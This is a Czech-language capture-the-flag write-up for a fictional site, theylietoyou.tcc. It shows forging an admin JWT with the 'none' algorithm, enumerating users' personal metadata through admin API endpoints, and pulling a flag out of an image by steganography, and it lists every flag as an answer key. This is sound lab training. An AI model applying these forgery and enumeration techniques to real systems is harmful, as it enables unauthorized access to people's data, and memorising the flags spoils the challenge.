# Chapter

1. Chapter 1: Exploration (2)
2. Chapter 2: The Owner (3)
3. Chapter 3: Count with Me (3)
4. Chapter 4: Hidden Information (4)

## Zadání

Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website <http://theylietoyou.tcc/story-line>.

Stay curious!

Všechny kapitoly mají stejné zadání a navazují na sebe.

## Chapter 1: Exploration (2)

Na stránce <http://theylietoyou.tcc/story-line> se nachází informace s přihlašovacími údaji pro <http://theylietoyou.tcc>

```text
Username: newWarrior
Password: chAng3melaTer123
```

V zobrazení příspěvků blogu je možné se přihlásit.
Při průzkumu síťové komunikace se používá <http://api.theylietoyou.tcc/api/auth/login>, která jako odpověď vrací JWT accessToken.

```json
{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIzNiIsImF1ZCI6InRjYy1hcGkiLCJyb2xlIjoiQVVUSE9SIiwiaXNzIjoiaHR0cDovL2FwaS50aGV5bGlldG95b3UudGNjIiwiZXhwIjoxNzkxMzE0Nzc1LCJpYXQiOjE3OTEzMTM4NzUsImp0aSI6ImVhNDQ2ZmNhLWM5OTEtNGFjZC1hYjFkLWM3ZjRmNzcyZGYyMiIsInVzZXJuYW1lIjoibmV3V2FycmlvciJ9.-iysspoZlXTif2RSXGAxf_MLnsUk50txHUpG_AxgEaw","tokenType":"Bearer","expiresIn":900}
```

Na stránce <http://api.theylietoyou.tcc/v3/api-docs> se nachází popis API rozhraní ve formátu openapi [api-docs.json](api-docs.json).

V popisu rozhraní se ukrývá flag `FLAG{McUs-Wrjs-8MbE-SiIt}`.

## Chapter 2: The Owner (3)

Popis rozhraní také obsahuje důležitou informaci

`This JWT is also very important for our DEV environment (untraceable-dev.theylietoyou.tcc)!`

Na adrese <http://untraceable-dev.theylietoyou.tcc> běží stejný server s api adresou <http://untraceable-dev-api.theylietoyou.tcc>.

Na stránce <https://www.jwt.io/> dekódujeme JWT z přihlášení

```json
{
  "alg": "HS256"
}

{
  "sub": "36",
  "aud": "tcc-api",
  "role": "AUTHOR",
  "iss": "http://api.theylietoyou.tcc",
  "exp": 1791314775,
  "iat": 1791313875,
  "jti": "ea446fca-c991-4acd-ab1d-c7f4f772df22",
  "username": "newWarrior"
}
```

Protože neznáme JWT podpisový klíč, zkusíme nastavit `none` a změnit obsah na

```python
{
  "sub": "36",
  "aud": "tcc-api",
  "role": "ADMIN",
  "iss": "http://api.theylietoyou.tcc",
  "exp": 1791314775,
  "iat": 1791313875,
  "jti": "ea446fca-c991-4acd-ab1d-c7f4f772df22",
  "username": "admin"
}
```

Výsledný JWT token je
`eyJhbGciOiJub25lIn0.eyJzdWIiOiIzNiIsImF1ZCI6InRjYy1hcGkiLCJyb2xlIjoiQURNSU4iLCJpc3MiOiJodHRwOi8vYXBpLnRoZXlsaWV0b3lvdS50Y2MiLCJleHAiOjE3OTEzMTQ3NzUsImlhdCI6MTc5MTMxMzg3NSwianRpIjoiZWE0NDZmY2EtYzk5MS00YWNkLWFiMWQtYzdmNGY3NzJkZjIyIiwidXNlcm5hbWUiOiJhZG1pbiJ9.`

Na původní stránce <http://theylietoyou.tcc> změněný token nefunguje, ale funguje na <http://untraceable-dev.theylietoyou.tcc/>.

V Dashboardu se zobrazí flag `FLAG{nJd3-nn70-B55u-ld34}`.

## Chapter 3: Count with Me (3)

Pro další část se nám bude hodit [Postman](https://www.postman.com/), do kterého jde naimportovat stažený openapi popis API rozhraní. Dále budeme pracovat s API rozhraní na <http://untraceable-dev-api.theylietoyou.tcc>, protože ten akceptuje změněný JWT token a je potřeba ho vložit do každého dotazu.

Z mnoha endpointů jsou zajímavé:

<http://untraceable-dev-api.theylietoyou.tcc/api/admin/conf>

```json
{
    "formula": "metaId = baseOffset + (userId * multiplier) + fieldOffset",
    "offsets": {
        "Email": 23,
        "Sex": 53,
        "Address": 41,
        "FirstName": 11,
        "LastName": 17,
        "Data": 99
    },
    "multiplier": 1000,
    "baseOffset": 154700
}
```

<http://untraceable-dev-api.theylietoyou.tcc/api/admin/users>

Vrací seznam uživatelů s ID 1..36

A nakonec <http://untraceable-dev-api.theylietoyou.tcc/api/admin/users/:userId/meta/:metaId>

userId je v rozsahu 1..36, metaId víme jak spočítat. Postupným vyčítáním informací narazíme u uživatele s ID 17 v meta Address na další flag 'Gran Vía 34 219, Barcelona, Spain ; FLAG{Ugaa-S1zs-UwsE-uIUA}'.

## Chapter 4: Hidden Information (4)

Poslední flag se skrývá u stejného uživatele v meta Data. Jedná se o obrázek zakódovaný v Base64.

![ ](image.png)

Obrázek v hlavičce obsahuje řetězec `c3RlZ2Fuby50aGV5bGlldG95b3UudGNj`, což je v Base64 zakódované `stegano.theylietoyou.tcc`. Tato stránka v rámci CTF neexistuje. Použijeme <https://stegotoolkit.com/steganography/stegsolve>, nahrajeme obrázek a přečteme si flag.

PS: Vypadalo to, že endpoint z dev API `api/admin/impersonate/:userId` by mohl být použit k vygenerování tokenu pro produkční server, ale podpisový klíč u dev serveru je jiný, takže vygenerovaný klíč nefunguje v produkčním serveru.

## Flag

Chapter 1: Exploration - `FLAG{McUs-Wrjs-8MbE-SiIt}`

Chapter 2: The Owner - `FLAG{nJd3-nn70-B55u-ld34}`

Chapter 3: Count with Me - `FLAG{Ugaa-S1zs-UwsE-uIUA}`

Chapter 4: Hidden Information - `FLAG{EcfI-bCKg-7x4I-nYlC}`
